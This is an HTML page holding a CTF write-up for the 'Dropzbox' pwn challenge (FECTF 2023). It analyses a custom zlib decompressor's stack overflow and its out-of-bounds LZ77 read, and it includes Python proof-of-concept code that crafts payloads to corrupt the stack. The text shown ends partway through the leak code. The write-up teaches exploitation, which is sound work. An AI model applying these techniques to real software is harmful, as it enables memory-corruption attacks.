@@ -1,0 +1,802 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\fectf-2023">FECTF 2023</a>
+            <a href="/CTF-writeups\fectf-2023\dropzbox/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>Dropzbox</span>
+            <span class="text-right">[-]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>For this challenge, we are given a binary along with a corresponding libc 2.36. I also do not have the description for this challenge, but the original did have a funny unintended. This writeup is for the vegan version of the challenge, the revenge to the original, which contained path traversal.</p>
+<hr />
+<h2>TLDR</h2>
+<p>Abusing an error in the LZ77 decoder, values from outside the buffer can be copied into the buffer. Using the checksum verification, the content of these can be brute forced. Once a stack pointer has been leaked, the canary can be leaked with a similar method, by redirecting the <code>buffer</code> pointer. Once the canary is known, one can simply ROP to system.</p>
+<hr />
+<h2>Recon</h2>
+<h3>Overview</h3>
+<p>Running the binary, we are presented with a program for sending, storing and receiving files from a server. The files are saved in your so-called workspace, a folder that you choose yourself. Files can the be sent in the ZLIB format with DEFLATE compression, where the program implements a custom inflator for decompressing the files you send. In contrast, files that we download aren't compressed at all.</p>
+<h3>The decompressor</h3>
+<p>As mentioned, the program supports full on DEFLATE, including fixed Huffman codes, dynamic Huffman codes, non-compressed blocks and LZ77 encoding. We can see this by disassembling the decompressor: </p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">last_block</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">last_block</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="mi">1uLL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">btype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="mi">2uLL</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">btype</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Invalid BTYPE</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1uLL</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEuLL</span><span class="p">,</span><span class="w"> </span><span class="n">stderr</span><span class="p">);</span>
+<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">btype</span><span class="w"> </span><span class="p">)</span><span class="w">                                </span><span class="c1">// Compressed blocks</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">btype</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">)</span><span class="w">                         </span><span class="c1">// Fixed huffman codes</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">      </span><span class="p">...</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="k">else</span><span class="w">                                      </span><span class="c1">// Dynamic huffman codes</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">else</span><span class="w">                                        </span><span class="c1">// Non-compressed blocks</span>
+<span class="w">    </span><span class="p">{</span>
+</code></pre></div>
+
+<p>The program maintains a buffer on the stack with all the currently decompressed data, along with values for buffer size and data length. On top of this, it reads individual bits via a custom struct wrapping stdin.</p>
+<p>When the buffer is exhausted, the program will allocate extra memory, which will be done through <code>alloca</code>, extending the stack. This can be seen multiple places, this is from the non-compressed block parsing:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">curr_len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">LEN</span><span class="w"> </span><span class="p">)</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloca</span><span class="p">(</span><span class="mi">16</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">23</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mh">0x10</span><span class="p">));</span>
+<span class="w">          </span><span class="n">dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">memmove</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">curr_len</span><span class="p">);</span>
+<span class="w">          </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dest</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloca</span><span class="p">(</span><span class="mi">16</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">23</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mh">0x10</span><span class="p">));</span>
+<span class="w">          </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LEN</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+<p>Once the process is done, the program allocates a fitting buffer on the heap and copies all decompressed data into the buffer.</p>
+<h3>Finding the bug</h3>
+<p>As we are dealing with a decompressor, this type of program is naturally prone to buffer overflows and overreads. First instinct is to try and desync the data length value from the actual data, but this proves to be infeasible, since the program has strict length checks for most input. Take this block from the non-compressed parsing as an example:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">curr_len</span><span class="p">,</span><span class="w"> </span><span class="mi">1uLL</span><span class="p">,</span><span class="w"> </span><span class="n">LEN</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">        </span><span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Read error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1uLL</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBuLL</span><span class="p">,</span><span class="w"> </span><span class="n">stderr</span><span class="p">);</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+<p>Looking closer at the memory allocation, the program seems to exhibit some strange behavior.  In all places where the program allocates, the program has two individual clauses, depending on whether <code>buffer</code>, the base of the data pointer, is initialized:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">curr_len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">LEN</span><span class="w"> </span><span class="p">)</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloca</span><span class="p">(</span><span class="mi">16</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">23</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mh">0x10</span><span class="p">));</span>
+<span class="w">          </span><span class="n">dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">memmove</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">curr_len</span><span class="p">);</span>
+<span class="w">          </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dest</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloca</span><span class="p">(</span><span class="mi">16</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">23</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mh">0x10</span><span class="p">));</span>
+<span class="w">          </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v15</span><span class="p">;</span>
+<span class="w">          </span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">curr_len</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LEN</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+<p>As we can see, when <code>buffer</code> is not initialized, the program properly allocates based on the requested block size. However, once <code>buffer</code> is initialized, it switches to a different clause, where the allocation size only depends on the current data length. I assume this clause is used to extend the allocated buffer upwards, but the developer "mistakenly" confused the two length values.</p>
+<p>Using this information, I made the following POW, using ZLIB to compress two blocks, then combining them by recalculating the checksum:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Converts a number n to a big endian bytearray &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">(((</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">((</span><span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">get_checksum</span><span class="p">(</span><span class="n">plt</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Returns 4 byte padded checksum for the given plaintext &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">adler32</span><span class="p">(</span><span class="n">plt</span><span class="p">))</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Generates a payload triggering the overflow in while loading uncompressed blocks &quot;&quot;&quot;</span>
+
+    <span class="c1"># Generate random data for block 1 and 2</span>
+    <span class="n">plain1</span> <span class="o">=</span> <span class="n">zero</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
+    <span class="n">plain2</span> <span class="o">=</span> <span class="n">zero</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span>
+    <span class="n">plain</span> <span class="o">=</span> <span class="n">plain1</span> <span class="o">+</span> <span class="n">plain2</span>
+
+    <span class="c1"># Individually compress blocks and extract header bytes</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">data1</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">plain1</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>  <span class="c1"># level=0 is uncompressed</span>
+    <span class="n">data2</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">plain2</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+
+    <span class="c1"># Combine data and clear &quot;last block&quot; bit in first block</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data1</span> <span class="o">+</span> <span class="n">data2</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="c1"># Calculate combined checksum and return complete data</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="n">checksum</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># Select namespace</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;pwn&quot;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x100</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Quit&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;plox&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>And indeed, this causes the program to segfault by overwriting important pointers with A's.</p>
+<h3>No leek :(</h3>
+<p>While attempting to exploit this vulnerability, I encountered problems with properly formulating an exploit without having leaks. As i mentioned, its quite hard to desync the data length from the actual input length, and even if you could (which you probably can), the program wouldn't actually save the data, unless the data passes the checksum verification.</p>
+<p>From talking with another team after the CTF, I know it to be possible to exploit without initial leaks. You can presumably offset the pointer that indicates return value, thereby getting a restricted write on the stack, which you can use for all kinds of creativity.</p>
+<p>Instead, I wanted to try exploiting an error I was fairly certain the program had. In order to explain it, I will first have to talk a bit about LZ77 encoding, and the DEFLATE algorithm as a whole.</p>
+<h3>LZ77 in DEFLATE</h3>
+<p>A part of the DEFLATE compression algorithm is the LZ77 encoding standard. This encoding seeks to compress data, by reducing duplicated sequences of characters to so-called length and distance codes. Observe the following example.</p>
+<p><img alt="" src="lz77.png" /></p>
+<p>The parenthesis encapsulating the two numbers indicate, that we are dealing with a length and distance code. The two numbers, 4 and 3 indicate length of sequence and distance from current position. With a distance of 3, the sequence is pointing back at the beginning of the data, and with a length of 4, it is telling the decompressor to take the bytes "AACA". Notice, that even though the sequence overlaps with itself, the decompressor can still resolve, that the last character will be an "A", same as the first.</p>
+<p>In order to implement this efficiently (this <em>is</em> a compression algorithm), the authors of DEFLATE devised a method for optimizing this process for many different length and distances.</p>
+<p>Using fixed Huffman codes, the following table describes input and output values for literals between 0 and 287:</p>
+<div class="codehilite"><pre><span></span><code>                   Lit Value    Bits        Codes
+                   ---------    ----        -----
+                     0 - 143     8          00110000 through
+                                            10111111
+                   144 - 255     9          110010000 through
+                                            111111111
+                   256 - 279     7          0000000 through
+                                            0010111
+                   280 - 287     8          11000000 through
+                                            11000111
+</code></pre></div>
+
+<p>Literals between 0 and 255 are simply literals; they describe one byte of data. However, anything above indicates the beginning of an LZ77 escape sequence, the specific value indicating the so-called length code.</p>
+<p>Using the length code, the decompressor then uses the following table to get a bit and lengths value:</p>
+<div class="codehilite"><pre><span></span><code>                 Extra               Extra               Extra
+            Code Bits Length(s) Code Bits Lengths   Code Bits Length(s)
+            ---- ---- ------     ---- ---- -------   ---- ---- -------
+             257   0     3       267   1   15,16     277   4   67-82
+             258   0     4       268   1   17,18     278   4   83-98
+             259   0     5       269   2   19-22     279   4   99-114
+             260   0     6       270   2   23-26     280   4  115-130
+             261   0     7       271   2   27-30     281   5  131-162
+             262   0     8       272   2   31-34     282   5  163-194
+             263   0     9       273   3   35-42     283   5  195-226
+             264   0    10       274   3   43-50     284   5  227-257
+             265   1  11,12      275   3   51-58     285   0    258
+             266   1  13,14      276   3   59-66
+</code></pre></div>
+
+<p>The lengths value here is an offset. The decompressor will read the following "bits" bits from the input, then add the result to that lengths value. The resulting value is then used as the length of the sequence being referred to.</p>
+<p>Something similar is done with the distance. Following this, the decompressor reads a 5 bit integer between 0 and 29, indicating the distance code. The distance code is then used to resolve the distance, in the exact same way as with the length, simply using a different table:</p>
+<div class="codehilite"><pre><span></span><code>                  Extra           Extra               Extra
+             Code Bits Dist  Code Bits   Dist     Code Bits Distance
+             ---- ---- ----  ---- ----  ------    ---- ---- --------
+               0   0    1     10   4     33-48    20    9   1025-1536
+               1   0    2     11   4     49-64    21    9   1537-2048
+               2   0    3     12   5     65-96    22   10   2049-3072
+               3   0    4     13   5     97-128   23   10   3073-4096
+               4   1   5,6    14   6    129-192   24   11   4097-6144
+               5   1   7,8    15   6    193-256   25   11   6145-8192
+               6   2   9-12   16   7    257-384   26   12  8193-12288
+               7   2  13-16   17   7    385-512   27   12 12289-16384
+               8   3  17-24   18   8    513-768   28   13 16385-24576
+               9   3  25-32   19   8   769-1024   29   13 24577-32768
+</code></pre></div>
+
+<p>In the end, an LZ77 sequence is described by <code>length code + length bits + distance code + distance bits</code>.</p>
+<p>If you want a more detailed explanation of DEFLATE, read the specification i used <a href="https://datatracker.ietf.org/doc/html/rfc1951">here</a>.</p>
+<h3>LZ77 out of bounds</h3>
+<p>We can actually read this exact behavior from our decompilation:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="n">distance_code</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">257</span><span class="p">;</span><span class="w">  </span><span class="c1">// Normalize to index</span>
+<span class="w">        </span><span class="n">length_code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length_bases</span><span class="p">[</span><span class="n">distance_code</span><span class="p">];</span><span class="w"> </span><span class="c1">// Read base from table</span>
+<span class="w">        </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length_code</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">read_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="n">length_bits</span><span class="p">[</span><span class="n">distance_code</span><span class="p">]);</span><span class="w">  </span><span class="c1">// Read bits</span>
+<span class="w">        </span><span class="n">distance_code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">huffman_decode</span><span class="p">(</span><span class="n">lz77_tree</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><span class="w"> </span><span class="c1">// Read distance code</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">distance_code</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0x1D</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="c1">// Anything above 29 is invalid</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Invalid distance value: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">distance_code</span><span class="p">);</span>
+<span class="w">          </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">distance_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">distance_bases</span><span class="p">[</span><span class="n">distance_code</span><span class="p">];</span><span class="w"> </span><span class="c1">// Read base from table</span>
+<span class="w">        </span><span class="n">distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">distance_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">read_bits</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="n">distance_bits</span><span class="p">[</span><span class="n">distance_code</span><span class="p">]);</span><span class="w">  </span><span class="c1">// Read bits</span>
+</code></pre></div>
+
+<p>Following this thread, the program will eventually execute:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">curr_len</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">curr_len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">distance</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
+</code></pre></div>
+
+<p>However, one thing that should definitely be present here is missing; the program never checks if the sequence goes out of bounds. Since the buffer is located on the stack, it is entirely possible "steal" data from outside the buffer, then brute force each byte using the checksum verification.</p>
+<hr />
+<h2>Exploitation</h2>
+<h3>Obtaining leaks</h3>
+<p>Based on the specification I explained earlier, I put together these functions to generate arbitrary LZ77 sequences:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">length_bases</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">258</span><span class="p">]</span>
